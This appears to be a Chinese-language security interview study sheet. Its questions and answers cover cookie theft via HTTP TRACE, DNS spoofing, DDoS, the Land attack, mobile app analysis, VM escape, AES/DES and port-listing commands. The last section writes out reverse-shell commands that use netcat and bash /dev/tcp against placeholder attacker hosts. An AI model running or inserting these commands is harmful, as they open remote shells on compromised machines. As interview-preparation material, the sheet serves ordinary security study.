Elasticsearch：远程代码执行、脚本注入、安全配置问题


### HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie
Http Trace攻击就可以将你的Header里的Cookie回显出来，
利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏


### 病毒和蠕虫的区别
病毒需要依附于其他程序或文件，以在执行这些程序或文件时进行复制和传播。病毒通常需要用户执行感染的程序或文件，以便启动和传播。
蠕虫是一种独立的恶意程序，无需依附于其他程序或文件。可以在未经用户干预的情况下自动传播，无需用户执行感染的程序或文件。


### DNS欺骗是什么
DNS欺骗目的是篡改DNS的解析结果，将用户发送的域名请求导向恶意的 IP 地址。
原理：
攻击者截目标用户发送的DNS查询请求。
攻击者伪造DNS响应，将目标域名解析结果替换为攻击者控制的恶意IP地址。
欺骗的DNS响应被发送给目标用户，用户的计算机将恶意IP地址与目标域名进行关联。
当用户尝试访问目标域名时，请求被发送到攻击者控制的恶意IP地址。
利用：
NS缓存投毒：攻击者向DNS缓存服务器发送伪造的DNS响应，将恶意IP地址存储在缓存中，使其他用户在查询相同域名时被重定向到恶意地址。
地Hosts文件修改：攻击者修改目标用户计算机上的本地Hosts文件，将目标域名与恶意IP地址进行映射，导致用户被重定向。
中间人攻击：攻击者在网络通信路径中截获DNS请求和响应，并篡改响应内容，将目标域名解析结果替换为恶意IP地址。


### DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议
SYN Flood：攻击者发送大量的TCP连接请求（SYN包），但不完成三次握手过程，导致目标服务器资源耗尽。
UDP Flood：攻击者向目标服务器发送大量的UDP数据包，占用服务器带宽和处理能力。
ICMP Flood：攻击者发送大量的ICMP Echo请求（ping请求），使目标服务器超负荷处理响应。
HTTP Flood：攻击者发送大量的HTTP请求，模拟正常用户访问行为，消耗目标服务器的资源。

CC攻击是通过向目标服务器发送大量的HTTP请求，超过其处理能力，以耗尽服务器资源或使其无法正常提供服务。
CC攻击是DDoS攻击的一种形式，用于针对HTTP/HTTPS服务的攻击，因此可以说CC攻击是DDoS攻击的一部分。


### 陆地land攻击是什么
and攻击是通过发送一系列具有相同源IP和目标IP的TCP数据包来实施的。
当目标主机接收到这些数据包时，它会尝试建立一个新的TCP连接，但由于源和目标IP地址相同，目标主机无法区分请求和响应，从而导致系统陷入死循环。


### 有没有移动端的调试经验 apk,ipa包分析
使用Burp Suite拦截和修改移动应用程序的请求和响应。使用Frida进行应用程序的行为分析和代码注入。使用逆向工程工具如apktool分析应用程序的代码。
IPA包（iOS应用程序包），Clutch是一款iOS应用程序逆向工程工具，可以用于提取和解密IPA包中的可执行文件。


### 对于云安全的理解
身份和访问管理：确保只有经过授权的用户能够访问云资源
数据保护：包括数据加密、数据备份、数据隔离和数据分类等措施
网络安全：包括网络分段、防火墙、入侵检测和预防系统
应用程序安全：确保在云中部署的应用程序具备足够的安全性，包括漏洞扫描、代码审计、安全配置和应用程序层防御等措施。
事件监控和响应：实施实时监控和日志分析，及时发现和响应潜在的安全事件


### 虚拟机逃逸的理解
虚拟机逃逸是指攻击者通过利用虚拟化软件或虚拟机的漏洞，从受限的虚拟机环境中逃脱并获取对宿主机或其他虚拟机的控制权限。


### AES／DES的具体工作步骤
AES和DES都是对称加密算法，AES使用较长的密钥长度和更复杂的轮函数运算，相对于DES来说更加安全和高效。
AES：
密钥生成：选择合适的密钥长度（通常为128位、192位或256位），生成用于加密和解密的密钥。
分组划分：将明文数据按照固定大小的分组（通常为128位）进行划分。
轮密钥扩展：根据密钥生成一系列轮密钥，用于后续的轮函数运算。
初始轮：将明文数据与初始轮密钥进行异或运算。
轮函数运算：对每个分组进行多轮的轮函数运算，包括字节代换、行位移、列混淆和轮密钥加。
最后一轮：在最后一轮轮函数运算后，将得到的结果与最后一轮密钥进行异或运算。
密文生成：得到加密后的密文数据。
解密过程与加密过程相反，使用相同的密钥和相同的步骤进行逆运算，最终得到原始的明文数据。
DES：
密钥生成：选择合适的密钥（通常为56位），生成用于加密和解密的密钥。
初始置换：对明文数据进行初始置换，重新排列数据位的顺序。
分组划分：将置换后的明文数据按照固定大小的分组（64位）进行划分。
轮函数运算：对每个分组进行多轮的轮函数运算，包括数据扩展、轮密钥生成、S盒代换和置换。
密文生成：得到加密后的密文数据。
解密过程与加密过程相反，使用相同的密钥和相同的步骤进行逆运算，最终得到原始的明文数据。


### 沙盒是什么，有什么作用
沙盒是将将应用程序或进程隔离在一个受控环境中，使其无法访问系统资源或执行潜在危险的操作。
利用：
沙盒可以限制应用程序对文件系统的访问权限
沙盒可以限制应用程序的网络访问权限
沙盒可以限制应用程序与其他进程之间的通信
沙盒可以限制应用程序对系统调用的访问权限
沙盒可以监控应用程序的行为


### 查看当前端口连接的命令有哪些？`netstat` 和 `ss` 命令的区别和优缺点；
使用终端，运行 netstat -tuln 命令可以显示当前所有的 TCP 和 UDP 连接，以及监听的端口。
使用 ss -tuln 命令也可以查看当前的 TCP 和 UDP 连接，以及监听的端口。
运行 lsof -i 命令可以列出当前打开的网络连接。

netstat:
优点：netstat 是一个广泛使用的命令，可用于多种操作系统，包括 Windows、Linux和 macOS。
它提供了多种选项和参数，可以显示各种网络连接、监听端口和路由表等信息。
缺点：在某些操作系统上，netstat 的输出可能相对较长，难以过滤和解析。某些版本的 netstat 也可能没有一些高级功能。
ss:
优点：ss 是一个新一代的网络工具，提供比 netstat 更快速和有效的网络连接查询。它能够显示更详细的连接信息，支持更多的过滤和排序选项。
缺点：ss 并不在所有操作系统上默认安装，需要单独安装。它的语法和选项可能与 netstat 略有不同，需要一些学习和适应的时间。
lsof:
优点：lsof 可以用于查看系统中所有打开的文件和网络连接，包括网络套接字和文件描述符等。它提供了广泛的选项和过滤条件，可以显示与网络相关的详细信息。
缺点：lsof 输出的信息可能相对复杂，对于初学者来说有一定的学习曲线。在某些操作系统上，lsof 需要以 root 或管理员权限运行才能查看所有进程的信息。


### 反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么？
在攻击者机器上监听指定端口：nc -lvp <port>
在受攻击者机器上反弹 shell：nc <attacker_ip> <attacker_port> -e /bin/bash
在受攻击者机器上反弹 shell：bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1


Bash 是许多 Linux 和 Unix 系统的默认 shell，因此在目标系统上使用 Bash 反弹 shell 可能更加通用。
Netcat 是一款强大的网络工具，一些版本可能被杀毒软件视为潜在恶意工具而被拦截。